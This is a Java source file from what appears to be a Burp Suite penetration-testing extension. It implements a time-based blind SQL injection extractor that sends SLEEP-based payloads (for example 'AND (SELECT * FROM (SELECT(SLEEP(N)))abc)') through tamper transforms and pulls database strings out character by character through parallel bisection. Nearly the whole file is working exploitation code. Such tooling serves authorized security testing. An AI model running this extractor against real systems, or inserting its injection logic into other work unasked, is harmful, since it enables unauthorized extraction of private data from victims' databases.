package com.omnistrike.modules.exploit.omnimap.technique;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.modules.exploit.omnimap.OmniMapCallback;
import com.omnistrike.modules.exploit.omnimap.OmniMapConfig;
import com.omnistrike.modules.exploit.omnimap.OmniMapResult;
import com.omnistrike.modules.exploit.omnimap.dbms.DbmsDialect;
import com.omnistrike.modules.exploit.omnimap.tamper.TamperEngine;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Time-based blind SQL injection extractor for OmniMap.
 * Same bisection algorithm as BlindExtractor but uses response timing
 * instead of content comparison.
 *
 * SPEED IMPROVEMENTS:
 * - Statistical validation: requires 2 consecutive timing confirmations
 *   to avoid network jitter false positives (reduces retries vs sqlmap)
 * - Adaptive delay: starts at configured delay, increases if server is slow
 * - Parallel extraction with careful thread management to avoid overwhelming the server
 */
public class TimeExtractor {

    private final MontoyaApi api;
    private final OmniMapConfig config;
    private final DbmsDialect dialect;
    private final OmniMapCallback callback;
    private final OmniMapResult result;
    private final HttpRequestResponse originalRequest;
    private final ResponseAnalyzer analyzer;
    private volatile boolean cancelled = false;

    /** Measured baseline response time (no delay) */
    private long baselineTimeMs = 0;

    /** Adaptive delay in seconds */
    private int currentDelay;

    /** Full printable ASCII range */
    private static final int ASCII_MIN = 32;
    private static final int ASCII_MAX = 126;

    public TimeExtractor(MontoyaApi api, OmniMapConfig config, DbmsDialect dialect,
                         OmniMapCallback callback, OmniMapResult result,
                         HttpRequestResponse originalRequest) {
        this.api = api;
        this.config = config;
        this.dialect = dialect;
        this.callback = callback;
        this.result = result;
        this.originalRequest = originalRequest;
        this.analyzer = new ResponseAnalyzer();
        this.currentDelay = config.getTimeDelay();
    }

    public void cancel() { this.cancelled = true; }

    /**
     * Test if time-based injection works.
     * Sends a known-true delayed condition and verifies the delay.
     * @return true if time-based injection is viable
     */
    public boolean detect() {
        callback.onProgress("TIME: Measuring baseline response time...", 5);

        // Measure baseline (normal request, no delay)
        long start = System.currentTimeMillis();
        var baseResp = sendPayloadRaw("");
        baselineTimeMs = System.currentTimeMillis() - start;
        if (baseResp == null || cancelled) return false;

        callback.onProgress("TIME: Baseline=" + baselineTimeMs + "ms. Testing delay...", 8);

        // Adapt delay if server is slow
        if (baselineTimeMs > 3000) {
            currentDelay = Math.max(currentDelay, (int) (baselineTimeMs / 1000) + 3);
        }

        // Test: inject nested subquery sleep like sqlmap
        // MySQL: AND (SELECT * FROM (SELECT(SLEEP(N)))abc)
        // Others: AND (SELECT CASE WHEN (1=1) THEN sleep ELSE 0 END)
        String payload = buildSleepPayload("1=1");
        payload = TamperEngine.apply(payload, config.getTampers());

        long responseTime = measureResponseTime(payload);
        if (cancelled) return false;

        boolean delayed = analyzer.isTimeBased(responseTime - baselineTimeMs, currentDelay);
        if (!delayed) {
            callback.onProgress("TIME: No delay detected (" + responseTime + "ms)", 0);
            return false;
        }

        // Statistical validation: confirm with a second test
        responseTime = measureResponseTime(payload);
        delayed = analyzer.isTimeBased(responseTime - baselineTimeMs, currentDelay);

        if (delayed) {
            callback.onProgress("TIME: Confirmed! Delay=" + currentDelay + "s, response=" + responseTime + "ms", 10);
            return true;
        }

        callback.onProgress("TIME: Inconsistent delay — possible jitter", 0);
        return false;
    }

    /**
     * Extract a single string value using time-based blind bisection.
     * Uses fewer parallel threads than boolean blind (to avoid server overload).
     */
    public String extractSingle(String query) {
        if (cancelled) return null;

        // Step 1: Get string length
        int length = extractLength(query);
        if (length <= 0 || cancelled) return null;

        callback.onProgress("TIME: Extracting " + length + " chars...", 20);

        // Step 2: Extract characters (limited parallelism for time-based)
        int threads = Math.min(config.getThreads(), Math.max(1, length / 2));
        ExecutorService pool = Executors.newFixedThreadPool(threads);

        char[] chars = new char[length];
        AtomicBoolean anyFailed = new AtomicBoolean(false);
        List<Future<?>> futures = new ArrayList<>();

        for (int pos = 1; pos <= length && !cancelled; pos++) {
            final int charPos = pos;
            futures.add(pool.submit(() -> {
                if (cancelled || anyFailed.get()) return;
                int ascii = extractCharAtPosition(query, charPos);
                if (ascii > 0) {
                    chars[charPos - 1] = (char) ascii;
                } else {
                    chars[charPos - 1] = '?';
                }
            }));
        }

        for (Future<?> f : futures) {
            try { f.get(120, TimeUnit.SECONDS); } catch (Exception e) { break; }
        }
        pool.shutdownNow();

        return new String(chars).trim();
    }

    /**
     * Extract a list of values.
     */
    public List<String> extractList(String query) {
        List<String> results = new ArrayList<>();
        if (cancelled) return results;

        for (int offset = 0; offset < 200 && !cancelled; offset++) {
            String limited = dialect.limitOffset(query, 1, offset);
            String val = extractSingle(limited);
            if (val == null || val.isEmpty()) break;
            results.add(val.trim());
            callback.onProgress("TIME: Extracted " + results.size() + " values...",
                    Math.min(90, 20 + results.size() * 5));
        }

        return results;
    }

    /**
     * Extract string length using binary search with time-based detection.
     */
    private int extractLength(String query) {
        String lengthExpr = dialect.lengthFunction(query);
        int low = 0, high = 64;

        // Find upper bound
        while (!cancelled) {
            if (testTimedCondition(lengthExpr + ">" + high)) {
                high *= 2;
                if (high > 1024) return -1;
            } else {
                break;
            }
        }

        // Binary search
        while (low < high && !cancelled) {
            int mid = (low + high) / 2;
            if (testTimedCondition(lengthExpr + ">" + mid)) {
                low = mid + 1;
            } else {
                high = mid;
            }
        }

        return low;
    }

    /**
     * Extract ASCII value at a position using tiered adaptive bisection.
     * Critical for time-based: each wasted request costs N seconds of sleep delay.
     *
     * Tier 1: lowercase a-z (97-122) — log2(26) ≈ 5 steps + 1 range check = 6 requests
     * Tier 2: digits 0-9 (48-57)     — log2(10) ≈ 4 steps + 1 range check = 5 requests
     * Tier 3: full ASCII (32-126)     — log2(95) ≈ 7 steps, no range check  = 7 requests
     *
     * At a 5s delay, saving 1 request per char saves 5s per character extracted.
     */
    private int extractCharAtPosition(String query, int position) {
        String asciiExpr = dialect.asciiAtPosition("(" + query + ")", position);

        // Tier 1: lowercase letters (most common in DB names/values)
        int result = bisectInRange(asciiExpr, 97, 122);
        if (result > 0) return result;

        // Tier 2: digits
        result = bisectInRange(asciiExpr, 48, 57);
        if (result > 0) return result;

        // Tier 3: full printable ASCII
        return bisectFull(asciiExpr, ASCII_MIN, ASCII_MAX);
    }

    /**
     * Check if the ASCII value is within [low, high] and bisect if so.
     * Costs 1 timed request for the range check. Returns -1 if not in range.
     */
    private int bisectInRange(String asciiExpr, int low, int high) {
        if (!testTimedCondition(asciiExpr + ">=" + low + " AND " + asciiExpr + "<=" + high)) {
            return -1;
        }
        return bisectFull(asciiExpr, low, high);
    }

    /**
     * Binary search bisection using time-based detection.
     */
    private int bisectFull(String asciiExpr, int low, int high) {
        while (low < high && !cancelled) {
            int mid = (low + high) / 2;
            if (testTimedCondition(asciiExpr + ">" + mid)) {
                low = mid + 1;
            } else {
                high = mid;
            }
        }
        return cancelled ? -1 : low;
    }

    /**
     * Test a condition using time-based injection.
     * Uses nested subquery wrapping like sqlmap.
     * Returns true if the response is delayed.
     */
    private boolean testTimedCondition(String condition) {
        String payload = buildSleepPayload(condition);
        payload = TamperEngine.apply(payload, config.getTampers());

        long responseTime = measureResponseTime(payload);
        return analyzer.isTimeBased(responseTime - baselineTimeMs, currentDelay);
    }

    /**
     * Build a time-based injection payload with nested subquery like sqlmap.
     * MySQL: AND (SELECT * FROM (SELECT(SLEEP(N)))abc) when unconditional
     *        AND IF(condition,SLEEP(N),0) wrapped in subquery when conditional
     * Others: AND (SELECT CASE WHEN (cond) THEN sleep ELSE 0 END)
     */
    private String buildSleepPayload(String condition) {
        if ("MySQL".equals(dialect.getName())) {
            if ("1=1".equals(condition)) {
                // Unconditional sleep: nested subquery like sqlmap
                return " AND (SELECT * FROM (SELECT(" + dialect.sleepFunction(currentDelay) + "))abc) ";
            } else {
                // Conditional sleep with IF, wrapped in subquery
                String sleepExpr = dialect.ifFunction(condition, dialect.sleepFunction(currentDelay), "0");
                return " AND (SELECT " + sleepExpr + ") ";
            }
        } else {
            // Non-MySQL: CASE WHEN wrapped in subquery
            String sleepExpr = dialect.ifFunction(condition, dialect.sleepFunction(currentDelay), "0");
            return " AND (SELECT " + sleepExpr + ") ";
        }
    }

    /**
     * Measure response time for a payload.
     */
    private long measureResponseTime(String payload) {
        long start = System.currentTimeMillis();
        sendPayload(payload);
        return System.currentTimeMillis() - start;
    }

    /**
     * Send payload and log it.
     */
    private burp.api.montoya.http.message.responses.HttpResponse sendPayload(String payload) {
        try {
            HttpRequest req = PayloadInjector.inject(originalRequest.request(),
                    config.getParameterName(), config.getParameterType(),
                    config.getPrefix() + payload + (config.getSuffix().isEmpty() ? "" : config.getSuffix()));
            long start = System.currentTimeMillis();
            HttpRequestResponse rr = api.http().sendRequest(req);
            long elapsed = System.currentTimeMillis() - start;
            result.incrementRequestCount();
            callback.onRequestSent(rr, payload, "TIME", elapsed);
            return rr.response();
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Send raw payload without tracking (for baseline measurement).
     */
    private burp.api.montoya.http.message.responses.HttpResponse sendPayloadRaw(String payload) {
        try {
            HttpRequest req = payload.isEmpty() ? originalRequest.request()
                    : PayloadInjector.inject(originalRequest.request(),
                    config.getParameterName(), config.getParameterType(), payload);
            HttpRequestResponse rr = api.http().sendRequest(req);
            result.incrementRequestCount();
            return rr.response();
        } catch (Exception e) {
            return null;
        }
    }

}
